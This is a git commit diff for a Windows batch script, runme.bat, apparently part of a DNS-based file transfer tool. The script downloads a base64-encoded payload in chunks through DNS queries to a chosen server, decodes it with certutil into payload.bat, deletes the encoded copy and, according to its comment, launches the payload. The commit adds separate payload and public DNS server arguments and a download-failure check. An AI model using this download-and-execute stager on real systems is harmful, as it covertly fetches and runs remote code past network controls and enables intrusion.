334d63b90f37ab4d77c7a6a7172e0b24529827db
daniel <daniel@armani.vinakovsky.com>
2015-08-18 20:16:32 -0400

    added more options

--- client/client_batch/runme.bat
+++ client/client_batch/runme.bat
@@ -6,11 +6,12 @@ REM http://www.gnurds.com
 setlocal EnableDelayedExpansion
 set encodedoutfile=outputb64
 set rawoutfile=payload.bat
-set dnsserver=%1
+set payloaddnsserver=%1
+set pubdnsserver=%3
 
 FOR /L %%I IN (0,1,%2) DO (
 	ECHO Downloaded part %%I of %2
-	FOR /f "skip=12 usebackq tokens=1" %%a IN (`dnsftp_downloader.bat %%I.%dnsserver%`) DO (
+	FOR /f "skip=12 usebackq tokens=1" %%a IN (`dnsftp_downloader.bat %%I.%payloaddnsserver% %pubdnsserver%`) DO (
 		set tempvar=%%a
 		REM strip quotation marks
 		set output=!tempvar:"=!
@@ -18,8 +19,13 @@ FOR /L %%I IN (0,1,%2) DO (
 		)
 )
 REM base64 decode the downloaded payload, overwrite.
-ECHO Decoding downloaded file...
-certutil -decode -f %encodedoutfile% %rawoutfile% > NUL
+IF EXIST %encodedoutfile% (
+	ECHO Decoding downloaded file...
+	certutil -decode -f %encodedoutfile% %rawoutfile%
+) ELSE (
+	ECHO Failed to download file
+	EXIT /B 1
+)
 REM delete the encoded payload
 DEL %encodedoutfile%
 REM launch the payload
